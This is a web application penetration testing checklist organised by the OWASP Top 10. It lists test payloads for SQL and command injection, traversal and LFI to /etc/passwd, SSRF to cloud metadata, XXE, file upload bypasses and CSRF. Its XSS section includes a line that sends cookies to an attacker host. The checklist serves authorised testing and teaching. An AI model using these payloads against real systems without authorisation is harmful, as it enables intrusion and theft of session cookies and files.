# 🌐 Web Application Testing Methodology

Comprehensive checklist for testing web applications.

## OWASP Top 10 (2021)

### 1. Broken Access Control
- [ ] IDOR (Insecure Direct Object References)
- [ ] Missing function level access control
- [ ] Directory traversal
- [ ] Force browsing to authenticated pages
- [ ] Parameter tampering

**Tests:**
```bash
# Change user ID in requests
GET /api/user/123 -> /api/user/124

# Try accessing admin panels
/admin
/administrator
/manage
/dashboard

# Directory traversal
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

### 2. Cryptographic Failures
- [ ] Sensitive data in clear text
- [ ] Weak encryption algorithms
- [ ] Insecure SSL/TLS configuration
- [ ] Weak password storage

**Tests:**
```bash
# Check SSL/TLS
sslscan target.com
testssl.sh target.com

# Look for sensitive data in:
# - Local storage
# - Session storage
# - Cookies
# - URL parameters
# - Source code
```

### 3. Injection
- [ ] SQL Injection
- [ ] NoSQL Injection
- [ ] Command Injection
- [ ] LDAP Injection
- [ ] XPath Injection

**SQL Injection Tests:**
```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
1' UNION SELECT NULL--
1' AND 1=1--
1' AND 1=2--
```

**Command Injection:**
```bash
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)
```

### 4. Insecure Design
- [ ] Missing security controls
- [ ] Business logic flaws
- [ ] Race conditions
- [ ] Insufficient rate limiting

**Tests:**
```bash
# Race conditions
# Send multiple requests simultaneously

# Rate limiting
# Automated tool or manual spam

# Business logic
# Register same email twice
# Negative numbers in price
# Apply same coupon multiple times
```

### 5. Security Misconfiguration
- [ ] Default credentials
- [ ] Directory listing
- [ ] Verbose error messages
- [ ] Unnecessary features enabled
- [ ] Missing security headers

**Tests:**
```bash
# Check headers
curl -I https://target.com

# Look for:
# - X-Frame-Options
# - Content-Security-Policy
# - Strict-Transport-Security
# - X-Content-Type-Options

# Try default creds
admin:admin
admin:password
root:root
```

### 6. Vulnerable and Outdated Components
- [ ] Outdated libraries
- [ ] Known CVEs in dependencies
- [ ] Unpatched frameworks

**Tests:**
```bash
# Retire.js (JavaScript libraries)
retire --js --path /path/to/js

# Dependency Check
dependency-check --project "App" --scan /path

# Check versions in:
# - Package.json
# - composer.json
# - pom.xml
# - requirements.txt
```

### 7. Authentication Failures
- [ ] Weak passwords allowed
- [ ] No account lockout
- [ ] Session fixation
- [ ] Credential stuffing possible
- [ ] Weak password reset

**Tests:**
```bash
# Weak passwords
password
123456
admin

# Brute force
# Use Burp Intruder or Hydra

# Password reset
# Check for token predictability
# Token reuse
# Token expiration
```

### 8. Software and Data Integrity Failures
- [ ] Unsigned updates
- [ ] Untrusted CI/CD pipeline
- [ ] Insecure deserialization

**Tests:**
```bash
# Check for serialization
# Look for patterns:
# - Java: rO0 (Base64 of serialized object)
# - PHP: a:, O:, s:
# - Python: pickle

# Modify serialized objects
```

### 9. Security Logging and Monitoring Failures
- [ ] Insufficient logging
- [ ] Logs not monitored
- [ ] Sensitive data in logs

**Tests:**
```bash
# Test if attacks are logged
# Attempt SQL injection and check if detected
# Try XSS and see if logged

# Check for sensitive data in logs
# Error messages exposing paths
# Stack traces
```

### 10. Server-Side Request Forgery (SSRF)
- [ ] SSRF in URL parameters
- [ ] SSRF in file uploads
- [ ] Blind SSRF

**Tests:**
```bash
# Try internal IPs
http://127.0.0.1
http://localhost
http://169.254.169.254 (AWS metadata)
http://192.168.1.1

# URL parameters
?url=http://internal-server
?redirect=http://attacker.com
?file=http://localhost/admin
```

---

## XSS Testing

### Reflected XSS
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
```

### Stored XSS
```javascript
// Test in:
// - Comments
// - Profile fields
// - Messages
// - Reviews

<script>alert(document.domain)</script>
<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>
```

### DOM XSS
```javascript
// Check URL fragments
#<script>alert(1)</script>

// Check URL parameters processed by JavaScript
?search=<img src=x onerror=alert(1)>
```

---

## CSRF Testing

```html
<!-- Basic CSRF PoC -->
<html>
  <body>
    <form action="https://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com"/>
      <input type="submit" value="Submit"/>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Check for:**
- [ ] CSRF tokens present
- [ ] Tokens validated
- [ ] SameSite cookie attribute
- [ ] Referer header validation

---

## API Testing

### 1. REST API

```bash
# Common methods to test
GET /api/users
POST /api/users
PUT /api/users/123
DELETE /api/users/123
PATCH /api/users/123

# Test different content types
Content-Type: application/json
Content-Type: application/xml
Content-Type: text/plain

# Test HTTP methods
OPTIONS /api/endpoint
TRACE /api/endpoint
```

### 2. GraphQL

```graphql
# Introspection query
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Test for injection
{
  user(id: "1' OR '1'='1") {
    name
  }
}

# Batch queries (DoS)
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  # ... repeat 1000 times
}
```

### 3. JWT Testing

```bash
# Decode JWT
echo "eyJhbGc..." | base64 -d

# Test for:
# - None algorithm
# - Weak secret (brute force)
# - Algorithm confusion (RS256 to HS256)
# - Expired tokens accepted
# - Token tampering

# jwt_tool
python3 jwt_tool.py <JWT>
```

---

## File Upload Testing

```bash
# Test different file types
test.php
test.php.jpg
test.jpg.php
test.php%00.jpg
test.php%0a.jpg

# Double extensions
test.jpg.php

# Case variations
test.PhP
test.pHp

# Content-Type manipulation
# Upload PHP file with Content-Type: image/jpeg

# Check for:
# - File type validation
# - File size limits
# - Filename sanitization
# - Path traversal in filename (../../file.php)
# - Malware scanning
# - Execution of uploaded files
```

---

## Authentication Testing

### Login

```bash
# Test for:
# - SQL injection in login
# - Username enumeration
# - Weak passwords
# - Rate limiting
# - Account lockout
# - Password complexity requirements

# Username enumeration
# Different responses for:
# - Valid user, wrong password
# - Invalid user
```

### Session Management

```bash
# Check cookies
# - Secure flag
# - HttpOnly flag
# - SameSite attribute
# - Expiration
# - Entropy

# Test for:
# - Session fixation
# - Session hijacking
# - Concurrent sessions
# - Logout functionality
```

---

## Authorization Testing

```bash
# Horizontal privilege escalation
# User A accesses User B's resources

# Vertical privilege escalation
# Regular user accesses admin functions

# Test all user roles:
# - Guest
# - Registered user
# - Premium user
# - Admin

# Parameter pollution
?role=user&role=admin
```

---

## Client-Side Testing

### Local Storage
```javascript
// Check for sensitive data
localStorage
sessionStorage

// Look for:
// - API keys
// - Tokens
// - PII
```

### Cookies
```bash
# Check for:
# - Sensitive data in cookies
# - Secure flag
# - HttpOnly flag
# - SameSite attribute
```

### Browser Console
```javascript
// Check for:
// - Console.log() with sensitive data
// - Exposed API endpoints
// - Debug mode enabled
```

---

## Testing Checklist

### Before Testing
- [ ] Read scope and rules
- [ ] Set up Burp Suite
- [ ] Configure browser
- [ ] Prepare wordlists

### During Testing
- [ ] Map all functionality
- [ ] Test each input field
- [ ] Test all user roles
- [ ] Check for OWASP Top 10
- [ ] Test APIs separately
- [ ] Check client-side security

### After Finding
- [ ] Verify vulnerability
- [ ] Assess impact
- [ ] Create PoC
- [ ] Document steps
- [ ] Take screenshots
- [ ] Write report

---

## Useful Payloads

### Polyglot XSS
```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### LFI
```bash
../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
```

### XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

---

## Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
